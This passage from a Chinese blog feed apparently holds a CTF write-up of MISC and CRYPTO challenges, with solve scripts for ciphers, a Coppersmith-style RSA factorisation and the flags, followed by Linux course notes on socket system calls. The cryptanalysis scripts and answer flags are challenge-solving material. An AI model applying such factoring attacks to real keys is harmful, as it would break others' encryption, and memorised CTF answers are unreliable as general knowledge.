<p>九键密码：ctfisfun</p>
<p>然后下载FreeFileCamouflage</p>
<p>输入密码和图片地址得到flag</p>
<p><code>flag&#123;Pudd1n!!_y0u_F1nd_m3!&#125;</code></p>
<h2 id="Sail-a-boat-down-the-river"><a href="#Sail-a-boat-down-the-river" class="headerlink" title="Sail a boat down the river"></a>Sail a boat down the river</h2><p>下载得到一个视频和加密的rar文件</p>
<p>视频打开中间一段明显有个二维码，扫描是一个网盘链接</p>
<p><code>https://pan.baidu.com/s/1tygt0Nm_G5fTfVFlgxVcrQ</code></p>
<p>密码是视频里摄像头的闪光（这真没想到）</p>
<p><code>-.--/.--/---../--.</code></p>
<p>得到密码：yw8g</p>
<p>下载得到数独，在线解</p>
<pre class="line-numbers language-none"><code class="language-none">0 8 1 7 4 0 0 0 0
3 0 2 0 6 8 0 0 0
4 0 6 5 0 0 8 2 0
0 3 0 0 0 0 0 5 6
7 0 4 3 0 9 2 0 1
1 2 0 0 0 0 0 4 0
0 5 9 0 0 4 1 0 8
0 0 0 1 8 0 9 0 2
0 0 0 0 9 7 4 6 0

密文:
efb851bdc71d72b9ff668bddd30fd6bd
密钥:
第一列九宫格从左到右从上到下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>得到密钥：<code>52693795149137</code></p>
<p>AES中hex解密得到<code>GG0kc.tf</code></p>
<p>解压rar文件得到<code>逆光 vocal.ovex</code>文件</p>
<p>使用<code>Overture 5</code>打谱软件打开，在歌词里看到flag</p>
<p><code>flag&#123;gkctf_is_fun&#125;</code></p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="小学生的密码学"><a href="#小学生的密码学" class="headerlink" title="小学生的密码学"></a>小学生的密码学</h2><pre class="line-numbers language-none"><code class="language-none">e(x)&#x3D;11x+6(mod26)
密文：welcylk
（flag为base64形式）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>仿射密码：<a href="http://ctf.ssleye.com/affine.html">http://ctf.ssleye.com/affine.html</a></p>
<p>然后base64一下，得到<code>flag&#123;c29yY2VyeQ==&#125;</code></p>
<h2 id="汉字的秘密"><a href="#汉字的秘密" class="headerlink" title="汉字的秘密"></a>汉字的秘密</h2><p>当铺密码，按照汉字出头的个数来答题数字，例</p>
<pre class="line-numbers language-none"><code class="language-none">田：0	由：1	王：6	壮：9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>翻译过来是：</p>
<pre class="line-numbers language-none"><code class="language-none">69 74 62 67 118 83 72 77 86 55 71
E  J  &gt;  C  v   S  H  M  V  7  G
57 82 57 62 63 51 107
9  R  9  &gt;  ?  3  k<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后就是变种凯撒</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">n <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">,</span><span class="token number">67</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">72</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">,</span><span class="token number">86</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">]</span>
s<span class="token operator">=</span><span class="token string">""</span>
j <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    s<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>j<span class="token punctuation">)</span>
    j<span class="token operator">+=</span><span class="token number">1</span>
<span class="token keyword">print</span> s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>flag&#123;you_are_good&#125;</code></p>
<h2 id="babycrypto"><a href="#babycrypto" class="headerlink" title="babycrypto"></a>babycrypto</h2><p>百度一下得知，强网杯原题，是已知p的高位，得到p的位</p>
<p>需要使用sage,sage安装：<a href="https://blog.csdn.net/vanarrow/article/details/106051909">https://blog.csdn.net/vanarrow/article/details/106051909</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">n <span class="token operator">=</span> 0xb119849bc4523e49c6c038a509a74cda628d4ca0e4d0f28e677d57f3c3c7d0d876ef07d7581fe05a060546fedd7d061d3bc70d679b6c5dd9bc66c5bdad8f2ef898b1e785496c4989daf716a1c89d5c174da494eee7061bcb6d52cafa337fc2a7bba42c918bbd3104dff62ecc9d3704a455a6ce282de0d8129e26c840734ffd302bec5f0a66e0e6d00b5c50fa57c546cff9d7e6a978db77997082b4cb927df9847dfffef55138cb946c62c9f09b968033745b5b6868338c64819a8e92a827265f9abd409359a9471d8c3a2631b80e5b462ba42336717700998ff38536c2436e24ac19228cd2d7a909ead1a8494ff6c3a7151e888e115b68cc6a7a8c6cf8a6c005L
p_fake <span class="token operator">=</span> 0xe4e4b390c1d201dae2c00a4669c0865cc5767bc444f5d310f3cfc75872d96feb89e556972c99ae20753e3314240a52df5dccd076a47c6b5d11b531b92d901b2b512aeb0b263bbfd624fe3d52e5e238beeb581ebe012b2f176a4ffd1e0d2aa8c4d3a2656573b727d4d3136513a931428b00000000000000000000000000000000L

pbits <span class="token operator">=</span> <span class="token number">1024</span>  
kbits <span class="token operator">=</span> <span class="token number">128</span>
pbar <span class="token operator">=</span> p_fake <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>pbits<span class="token operator">-</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">)</span>  
<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"upper %d bits (of %d bits) is given"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>pbits<span class="token operator">-</span>kbits<span class="token punctuation">,</span> pbits<span class="token punctuation">)</span><span class="token punctuation">)</span>
   
PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>  
f <span class="token operator">=</span> x <span class="token operator">+</span> pbar  
x0 <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment"># find root &lt; 2^kbits with factor >= n^0.3  </span>
p <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x0 <span class="token operator">+</span> pbar<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'p='</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>得到p，然后就简单了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> libnum
n <span class="token operator">=</span> 0xb119849bc4523e49c6c038a509a74cda628d4ca0e4d0f28e677d57f3c3c7d0d876ef07d7581fe05a060546fedd7d061d3bc70d679b6c5dd9bc66c5bdad8f2ef898b1e785496c4989daf716a1c89d5c174da494eee7061bcb6d52cafa337fc2a7bba42c918bbd3104dff62ecc9d3704a455a6ce282de0d8129e26c840734ffd302bec5f0a66e0e6d00b5c50fa57c546cff9d7e6a978db77997082b4cb927df9847dfffef55138cb946c62c9f09b968033745b5b6868338c64819a8e92a827265f9abd409359a9471d8c3a2631b80e5b462ba42336717700998ff38536c2436e24ac19228cd2d7a909ead1a8494ff6c3a7151e888e115b68cc6a7a8c6cf8a6c005L
p <span class="token operator">=</span> <span class="token number">0xe4e4b390c1d201dae2c00a4669c0865cc5767bc444f5d310f3cfc75872d96feb89e556972c99ae20753e3314240a52df5dccd076a47c6b5d11b531b92d901b2b512aeb0b263bbfd624fe3d52e5e238beeb581ebe012b2f176a4ffd1e0d2aa8c4d3a2656573b727d4d3136513a931428b92826225b6d0e735440b613a8336ffa3</span>
q <span class="token operator">=</span> n<span class="token operator">/</span>p
e <span class="token operator">=</span> <span class="token number">65537</span>
c <span class="token operator">=</span> <span class="token number">1422566584480199878714663051468143513667934216213366733442059106529451931078271460363335887054199577950679102659270179475911101747625120544429262334214483688332111552004535828182425152965223599160129610990036911146029170033592055768983427904835395850414634659565092191460875900237711597421272312032796440948509724492027247376113218678183443222364531669985128032971256792532015051829041230203814090194611041172775368357197854451201260927117792277559690205342515437625417792867692280849139537687763919269337822899746924269847694138899165820004160319118749298031065800530869562704671435709578921901495688124042302500361</span>
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>flag&#123;3d0914a1-1e97-4822-a745-c7e20c5179b9&#125;</code></p>
<h2 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h2><p>下载得到加密脚本，公钥以及密文</p>
<p>将公钥提取出来，可以分解n</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> libnum
cipher<span class="token operator">=</span><span class="token string">"MDIxNDJhZjdjZTcwZmUwZGRhZTExNmJiN2U5NjI2MDI3NGVlOTI1MmE4Y2I1MjhlN2ZkZDI5ODA5YzJhNjAzMjcyN2MwNTUyNjEzM2FlNDYxMGVkOTQ0NTcyZmYxYWJmY2QwYjE3YWEyMmVmNDRhMg=="</span>
c<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>
<span class="token keyword">print</span> c
c <span class="token operator">=</span> <span class="token number">0x02142af7ce70fe0ddae116bb7e96260274ee9252a8cb528e7fdd29809c2a6032727c05526133ae4610ed944572ff1abfcd0b17aa22ef44a2</span>
n <span class="token operator">=</span> <span class="token number">15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739</span>
p <span class="token operator">=</span> <span class="token number">3386619977051114637303328519173627165817832179845212640767197001941</span>
q <span class="token operator">=</span> <span class="token number">4582433561127855310805294456657993281782662645116543024537051682479</span>
e <span class="token operator">=</span> <span class="token number">65537</span>
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>flag&#123;760958c9-cca9-458b-9cbe-ea07aa1668e4&#125;</code></p>
]]></content>
      <categories>
        <category>比赛</category>
      </categories>
      <tags>
        <tag>CRYPTO</tag>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux程序设计（三）</title>
    <url>/2020/12/09/linux-cheng-xu-she-ji-san/</url>
    <content><![CDATA[<p>Linux课程笔记</p>
<p>对应PPT第4章：Sockets</p>
<span id="more"></span>
<h1 id="Socket-Connections"><a href="#Socket-Connections" class="headerlink" title="Socket Connections"></a>Socket Connections</h1><h2 id="What-is-a-Socket"><a href="#What-is-a-Socket" class="headerlink" title="What is a Socket"></a>What is a Socket</h2><p>套接字是一种通信机制，它允许在本地，单机或跨网络开发客户端/服务器系统。<br>套接字的创建和使用与管道不同，因为它们在客户端和服务器之间有明显的区别。<br>套接字机制可以实现连接到单个服务器的多个客户端。</p>
<h2 id="Connections"><a href="#Connections" class="headerlink" title="Connections"></a>Connections</h2><p>首先，服务器应用程序创建一个套接字。<br>接下来，服务器进程为套接字命名。套接字使用系统调用绑定命名。</p>
<ul>
<li>本地套接字在Linux文件系统中有一个文件名，通常在 <code>/tmp</code> 或 <code>/usr/tmp</code> 中找到。</li>
<li>对于网络套接字，文件名将是与客户端可以连接到的特定网络相关的服务标识符（端口号/访问点）。</li>
</ul>
<p>系统调用，侦听，为传入连接创建队列。<br>服务器可以使用系统调用接受接受它们。<br>当服务器调用accept时，将创建一个与指定套接字不同的新套接字。</p>
<ul>
<li>此新套接字仅用于与此特定客户端的通信。</li>
<li>命名的套接字将保留，以用于其他客户端的进一步连接。</li>
</ul>
<p>客户端通过调用套接字来创建未命名的套接字。然后，它使用服务器的命名套接字作为地址，调用connect建立与服务器的连接。<br>一旦建立，套接字就可以像低级文件描述符一样使用，提供双向数据通信。</p>
<h2 id="Socket-Attributes"><a href="#Socket-Attributes" class="headerlink" title="Socket Attributes"></a>Socket Attributes</h2><p>套接字的特征在于三个属性：domain(域)，type(类型)和protocol(协议)，并且有一个地址用作其名称。<br>地址的格式取决于域（也称为协议系列）而有所不同。<br>每个协议族都可以使用一个或多个地址族来定义地址格式。</p>
<ol>
<li><p>Socket Domains</p>
<p>域指定套接字通信将使用的网络介质。<br>最常见的套接字域是 <code>AF_INET</code> ，它是指Internet网络。</p>
<ul>
<li>底层协议，Internet协议（<code>IP</code>）</li>
</ul>
<p>UNIX文件系统域 <code>AF_UNIX</code> 可由基于可能未联网的单台计算机的套接字使用。</p>
<ul>
<li>基本协议是文件输入/输出，地址是绝对文件名。</li>
</ul>
<p>可能使用的其他域包括用于基于ISO标准协议的网络的<code>AF_ISO</code>和用于Xerox网络系统的<code>AF_XNS</code>。</p>
</li>
<li><p>Socket Types</p>
<p><code>SOCK_STREAM</code> (流套接字)</p>
<ul>
<li>流套接字提供的连接是有序的和可靠的双向字节流。</li>
<li>由 <code>SOCK_STREAM</code> 类型指定的流套接字是通过 <code>TCP/IP</code> 连接在 <code>AF_INET</code> 域中实现的。</li>
</ul>
<p><code>SOCK_DGRAM</code> (数据报套接字)</p>
<ul>
<li>由 <code>SOCK_DGRAM</code> 类型指定的数据报套接字无法建立和维护连接。</li>
<li>数据报套接字通过 <code>UDP/IP</code> 连接在 <code>AF_INET</code> 域中实现。</li>
</ul>
</li>
<li><p>Socket Protocols</p>
<p>如果底层传输机制允许多个协议提供请求的套接字类型，则可以为套接字选择特定的协议。<br>我们将集中讨论UNIX网络和文件系统套接字，这不需要您选择默认协议以外的协议。</p>
</li>
</ol>
<h2 id="Creating-a-Socket"><a href="#Creating-a-Socket" class="headerlink" title="Creating a Socket"></a>Creating a Socket</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span>
<span class="token keyword">int</span> <span class="token function">socket</span><span class="token punctuation">(</span><span class="token keyword">int</span> domain<span class="token punctuation">,</span> <span class="token keyword">int</span> type<span class="token punctuation">,</span> <span class="token keyword">int</span> protocol<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>套接字系统调用创建一个套接字并返回可用于访问该套接字的描述符。<br>域参数指定地址族，类型参数指定与此套接字一起使用的通信（通信）的类型，协议指定要使用的协议。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Domains</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>AF_UNIX</code></td>
<td>UNIX internal (file system sockets)</td>
</tr>
<tr>
<td><code>AF_INET</code></td>
<td>ARPA Internet protocols (UNIX network sockets)</td>
</tr>
<tr>
<td><code>AF_ISO</code></td>
<td>ISO standard protocols</td>
</tr>
<tr>
<td><code>AF_NS</code></td>
<td>Xerox Network System protocols</td>
</tr>
<tr>
<td><code>AF_IPX</code></td>
<td>Novell IPX protocol</td>
</tr>
<tr>
<td><code>AF_APPLETALK</code></td>
<td>Appletalk DDS</td>
</tr>
</tbody>
</table>
</div>
<p>最常见的套接字域是 <code>AF_UNIX</code>（用于通过UNIX和Linux文件系统实现的本地套接字）和 <code>AF_INET</code> （用于UNIX网络套接字）。</p>
<p>套接字参数类型指定要用于新套接字的通信特性。可能的值包括 <code>SOCK_STREAM</code> 和 <code>SOCK_DGRAM</code> 。<br>用于通信的协议通常由套接字类型和域确定。<br>套接字系统调用返回一个描述符，并且当套接字已连接到另一个端点套接字时，您可以将读写系统调用与描述符一起使用，以在套接字上发送和接收数据。<br>close系统调用用于结束套接字连接。</p>
<h2 id="Socket-Addresses"><a href="#Socket-Addresses" class="headerlink" title="Socket Addresses"></a>Socket Addresses</h2><p>每个套接字域都需要其自己的地址格式。<br>对于 <code>AF_UNIX</code> 套接字，该地址由 <code>sys/un.h</code> 包含文件中定义的结构 <code>sockaddr_un</code> 描述。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">socket_un</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">sa_family_t</span>   sun_family<span class="token punctuation">;</span>    <span class="token comment">/* AF_UNIX */</span>
    <span class="token keyword">char</span>          sun_path<span class="token punctuation">;</span>      <span class="token comment">/* pathname */</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>在 <code>AF_INET</code> 域中，使用 <code>netinet/in.h</code> 中定义的称为 <code>sockaddr_in</code> 的结构指定地址，该结构至少包含以下成员：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">short</span> <span class="token keyword">int</span>             sin_family<span class="token punctuation">;</span>   <span class="token comment">/* AF_INET */</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span>    sin_port<span class="token punctuation">;</span>     <span class="token comment">/* Port number */</span>
    <span class="token keyword">short</span> in_addr         sin_addr<span class="token punctuation">;</span>     <span class="token comment">/* Internet address */</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>IP地址结构 <code>in_addr</code> 定义如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">in_addr</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">int</span>     s_addr<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>为了使套接字可供其他进程使用，服务器程序需要给套接字命名。</p>
<ul>
<li><code>AF_UNIX</code> 套接字与文件系统路径名相关联，</li>
<li><code>AF_INET</code> 套接字与 <code>IP</code> 端口号关联。</li>
</ul>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span>
<span class="token keyword">int</span> <span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">int</span> socket<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>address<span class="token punctuation">,</span> <span class="token class-name">size_t</span> address_len<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>bind系统调用将在参数address中指定的地址分配给与文件描述符套接字关联的未命名套接字。</p>
<p>地址结构的长度作为 <code>address_len</code> 传递。 地址的长度和格式取决于地址系列。<br>在bind调用中，需要将特定的地址结构指针转换为通用地址类型（<code>struct sockaddr *</code>）。<br>成功完成后，bind返回0。如果失败，则返回-1并设置 <code>errno</code> 。</p>
<h2 id="Creating-a-Socket-Queue"><a href="#Creating-a-Socket-Queue" class="headerlink" title="Creating a Socket Queue"></a>Creating a Socket Queue</h2><p>若要接受套接字上的传入连接，服务器程序必须创建一个队列来存储未处理请求。 它使用侦听系统调用执行此操作。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span>
<span class="token keyword">int</span> <span class="token function">listen</span><span class="token punctuation">(</span><span class="token keyword">int</span> socket<span class="token punctuation">,</span> <span class="token keyword">int</span> backlog<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>listen将队列长度设置为积压。 通过侦听提供此机制，以允许在服务器程序忙于处理先前的客户端时将传入连接保持为挂起状态。 积压值为5是很常见的。<br>监听函数成功返回0，错误返回-1。</p>
<h2 id="Accepting-Connections"><a href="#Accepting-Connections" class="headerlink" title="Accepting Connections"></a>Accepting Connections</h2><p>一旦服务器程序创建并命名了套接字，它就可以等待通过使用accept系统调用建立与套接字的连接。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span>
<span class="token keyword">int</span> <span class="token function">accept</span><span class="token punctuation">(</span><span class="token keyword">int</span> socket<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>address<span class="token punctuation">,</span> <span class="token class-name">size_t</span> <span class="token operator">*</span>address_len<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>当客户端程序尝试连接到由参数socket指定的套接字时，accept系统调用返回。<br>accept函数创建一个新的套接字来与客户端通信并返回其描述符。套接字必须先前已通过绑定调用被命名，并且监听已分配了连接队列。<br>调用方客户端的地址将放置在由地址指向的 <code>sockaddr</code> 结构中。<br>在调用accept之前，必须将 <code>address_len</code> 设置为预期的地址长度。 返回时，<code>address_len</code> 将被设置为呼叫客户端地址结构的实际长度。<br>当存在未处理的客户端连接或错误为-1时，accept函数将返回新的套接字文件描述符。</p>
<h2 id="Requesting-Connections"><a href="#Requesting-Connections" class="headerlink" title="Requesting Connections"></a>Requesting Connections</h2><p>客户端程序通过调用connect在未命名套接字和服务器侦听套接字之间建立连接来连接到服务器。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span>
<span class="token keyword">int</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token keyword">int</span> socket<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>address<span class="token punctuation">,</span> <span class="token class-name">size_t</span> address_len<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>参数套接字指定的套接字连接到参数地址指定的服务器套接字，该地址的长度为 <code>address_len</code> 。<br>如果成功，则connect返回0，并且在错误时返回-1。 如果无法立即建立连接，则连接将在未指定的超时时间内阻塞。</p>
<h2 id="Closing-a-Socket"><a href="#Closing-a-Socket" class="headerlink" title="Closing a Socket"></a>Closing a Socket</h2><p>我们可以通过调用close终止服务器和客户端上的套接字连接。<br>我们应该始终关闭两端的套接字。</p>
<h2 id="Host-and-Network-Byte-Ordering"><a href="#Host-and-Network-Byte-Ordering" class="headerlink" title="Host and Network Byte Ordering"></a>Host and Network Byte Ordering</h2><p>端口号和地址通过套接字接口作为二进制数进行通信。<br>不同的计算机对整数使用不同的字节顺序。</p>
<ul>
<li>英特尔处理器将32位整数作为四个连续字节存储在内存中，顺序为1-2-3-4，其中1是最高有效字节。</li>
<li>摩托罗拉处理器将以字节顺序4-3-2-1存储整数。</li>
</ul>
<p>如果简单地逐字节复制用于整数的内存，则两台不同的计算机将无法在整数值上达成共识。</p>
<p><img src="/picture/6.png" alt></p>
<p>对于整数而言，最有意义的位是最高位。<br><code>big_endian</code>(网络字节顺序)，最有意义的字节放在一个字的最前面。<br><code>small_endian</code>,最有意义的字节放在一个字的最后面。</p>
<p>为了使不同类型的计算机能够就通过网络传输的多字节整数的值达成共识，我们需要定义网络顺序。<br>客户端和服务器程序必须使用 <code>netinet/in.h</code> 中定义的函数在传输之前将其内部整数表示形式转换为网络顺序。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netinet/in.h></span></span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">int</span> <span class="token function">htonl</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">int</span> hostlong<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> hostshort<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">int</span> <span class="token function">ntohl</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">int</span> netlong<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> <span class="token function">ntohs</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> netshort<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这些函数在本地主机格式和标准网络顺序之间转换16位和32位整数。<br>它们的名称是转换的缩写，例如，“host to network, long”（<code>htonl</code>）和“host to network, short”（<code>htons</code>）。<br>对于本机排序与网络排序相同的计算机，这些表示空操作。<br>始终使用转换功能以使架构不同的计算机上的客户端和服务器正确运行仍然很重要。</p>
<h1 id="Network-Information"><a href="#Network-Information" class="headerlink" title="Network Information"></a>Network Information</h1><p>如果您有权这样做，则可以将服务器添加到 <code>/etc/services</code> 中的已知服务列表中，该列表为端口号分配一个名称，以便客户端可以使用符号服务而不是数字。<br>给定计算机的名称后，您可以通过调用为您解析地址的主机数据库函数来确定 <code>IP</code> 地址。<br>主机数据库功能在接口头文件 <code>netdb.h</code> 中声明。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netdb.h></span></span>
<span class="token keyword">struct</span> <span class="token class-name">hostent</span> <span class="token operator">*</span><span class="token function">gethostbyaddr</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">,</span> <span class="token keyword">int</span> type<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">hostent</span> <span class="token operator">*</span><span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这些函数返回的结构必须至少包含以下成员：</p>
